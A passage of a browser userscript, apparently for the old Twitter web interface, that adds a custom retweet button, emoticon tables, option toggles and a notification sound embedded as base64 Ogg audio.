          setValue("yodMarkMention", this.checked ? 1 : 0);
          return false;
        }, false);
      }

      // cb_yodAdvTop Events
      if (cb_yodAdvTop = g("cb_yodAdvTop")) {
        cb_yodAdvTop.addEventListener('click', function(){
          if (elyodAdvTop = g("yodAdvTop")) {
            setValue("yodAdvTop", this.checked ? 1 : 0);
            var sClass = 'Hide';
            if (this.checked) {
              sClass = 'Show';
            }
            elyodAdvTop.className = 'yod' + sClass;
          }
          return false;
        }, false);
      }

      // AutoCut 140 Events
      if (cb_yodRTOpt_auto140 = g("cb_yodRTOpt_auto140")) {
        cb_yodRTOpt_auto140.addEventListener('click', function(){
          setValue("yodRT_auto140", this.checked ? 1 : 0);
          if (this.checked) doyodRTFit140();
          return false;
        }, false);
      }

      // Custom RT Events
      if (ip_yodRTOpt_RTTxt = g("ip_yodRTOpt_RTTxt")) {
        evts = ["blur","change","click","focus","input","keydown","keypress","keyup","mousedown","mouseup","paste"];
        for (a in evts) {
          ip_yodRTOpt_RTTxt.addEventListener(evts[a], function(){
            setValue("yodRT_RTText", this.value ? this.value : "?");
            valRT = doyodGetStrOpt("yodRT_RTText");
          }, false);
        }
      }

      // Show/Hide Emote Table Events
      if (yodRTEmo = g("yodRTEmo")) {
        var el2yodRTEmo = c1('.//legend', yodRTEmo);
        el2yodRTEmo.addEventListener('click', function(){
          toggleShow(this.nextElementSibling, yodRTEmo.id);
          return false;
        }, false);
      }

      // Show/Hide OPTION Table Events
      if (yodOPTION = g("yodOPTION")) {
        var el2yodOPTION = c1('.//legend', yodOPTION);
        el2yodOPTION.addEventListener('click', function(){
          toggleShow(this.nextElementSibling, yodOPTION.id);
          return false;
        }, false);
      }
    }
  }
}

function playsound() {
  if (!yod_frun) return;
  if (!(valPlaySound = doyodGetBoolOpt("yodPlaySound"))) return;
  g('yodnotify').play();
}

function expandNewTweet() {
  var s_gm_counter = 'gm_expandNewTweet';
  if (gm_counter = g(s_gm_counter)) {
    document.head.removeChild(gm_counter);
  }
  addCS('expandNewTweet(".new-tweets-bar");', s_gm_counter);
}

function yod_rtDiag(e, e2) {
  var elx, target, txt;
  elx = e2 || e.currentTarget;

  if (c1('.//*[contains(@class,"yod-rt")]', elx)) return false;

  if (target =
    c1('.//button[contains(@class,"cancel-action")]', elx)
    || c1('.//div[contains(@class,"js-prompt-cancel")]', elx)
  ) {
    b = target.cloneNode(true); b.innerHTML = "RT"; b.className = "btn yod-rt";
    b.addEventListener('click', function(){
      yod_make_RT2(elx);
      //if (e2 && (elx = g('tweet_dialog'))) yod_goDiag(e, elx);
      return false;
    }, false);
    target.parentNode.appendChild(b);
  }
}


/*
function yod_slideshow(e) {
  if (el = e.currentTarget) yod_make_RT(el.firstElementChild);
}
*/

// GLOBAL Variable
var debug = 0;
var rtDiag, countMsg, my_screen_name, logged, twp, yodRTDiv = false;
var valRT = doyodGetStrOpt("yodRT_RTText", "RT");
var valEmote = doyodGetBoolOpt("yodRTEmo");
var valOption = doyodGetBoolOpt("yodOPTION");
var valAdvTop = doyodGetBoolOpt("yodAdvTop", 1);
var valPlaySound = doyodGetBoolOpt("yodPlaySound", 1);
var valMarkMention = doyodGetBoolOpt("yodMarkMention", 1);
var symbols = ("\\m/ ||| d(^_^)b ||| (^_^) ||| \\(^_^)/ ||| v(^_^)v ||| (*-*) ||| (*_*) ||| (T_T) ||| (!__!) ||| m(_ _)m ||| (>_<) ||| (=_=) ||| (-.-)Zzz ||| (-_-*) ||| (^_~) ||| (._.) ||| (<.<) ||| (-__-) ||| (@_@) ||| (X_X) ||| ($_$) ||| ( .__.)/||").split("|||");
var symbols_utf = ("\u2605 | \u00B1 | \u00bd | \u2122 | \u2260 | \u2190 | \u2191 | \u2192 | \u2193 | \u2194 | \u00ab | \u00bb | \u25ba | \u266b | <( \u203e\u25bf\u203e)-\u03c3 | \u2512(\u0283\u0283\u0283_-)\u250e").split("|");

function doExec() {
  // Go if User Logged
  if (logged = c1('.//a[contains(@id,"new-tweet")]') || c1('.//*[contains(@class,"global-new-tweet")]')) {

    // Do 1st Strike
    starter();
    //setTimeout(starter, 5000);

    var el = c1('.//div/div[contains(@class,"js-mini-current-user")]');
    my_screen_name = el ? el.getAttribute('data-screen-name') : "";

    // new wrapper
    if (rtDiag = c1('.//div[contains(@id,"retweet-tweet-dialog")]')) {
      rtDiag.addEventListener("DOMSubtreeModified", yod_rtDiag, true);
    }

    // new wrapper
    if (twp = c1('.//div[contains(@id,"global-tweet-dialog")]')) {
      twp.addEventListener("DOMNodeInserted", yod_goDiag, true);
    }

    // old wrapper
    else if (twp = c1('.//div[contains(@class, "twttr-dialog-wrapper")]')) {
      twp.addEventListener("DOMNodeInserted", yod_goDiag, true);
      //twp.addEventListener("DOMSubtreeModified", yod_rtDiag, true);
    }

    document.addEventListener('DOMNodeInserted', function (event) {
      var cname, elmt = event.target;
      if (!(/DIV/.test(elmt.tagName))) return;
      if (cname = elmt.className) {
        if (
          (/stream-item/.test(cname)) ||
          (/js-tweet-details-fixer/.test(cname)) ||
          (/component/.test(cname)) ||
          (/dashboard/.test(cname)) ||
          (/content-main/.test(cname))
        ) {
          if (el = c1('.//div[contains(@class, "new-tweets-bar")]')) {
            expandNewTweet();
          }
          yod_frun++;
          yod_render(1);
        } else if (
          (/in-reply-to/.test(cname)) ||
          (/recent-tweets/.test(cname)) ||
          (/simple-tweet/.test(cname))
        ) {
          yod_frun++;
          yod_render();
        } else if (
          (/js-conversation-replies/.test(cname)) ||
          (/permalink/.test(cname))
        ) {
          yodInlineReply(elmt);
          yod_render();
        } /*else {
          // User Gallery
          setTimeout(function(){
            var tweet;
            if (tweet = c1('.//div[contains(@class,"media-slideshow-tweet")]'), elmt) {
              if (tweet !== null) tweet.addEventListener("DOMNodeInserted", yod_slideshow, true);
            }
          }, 1000);
        }*/
        //o_debug(cname);
      }

    }, false);

    // Re-fired!
    //setTimeout(starter, 5000);
  }
}

function doStuff() {
  usoUpdate();
  doExec();
  sound = new Audio("data:audio/ogg;base64,\
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");
  sound.id = 'yodnotify';
  sound.controls = false;
  sound.loop = false;
  sound.autoplay = false;
  sound.volume = 0.7; //0.0-1.0
  sound.setAttribute('style', 'position:absolute; left:-1000px; top:-1000px;')
  document.body.appendChild(sound);
}

var yod_frun = -1;
document.addEventListener("DOMContentLoaded", doStuff, true);
})();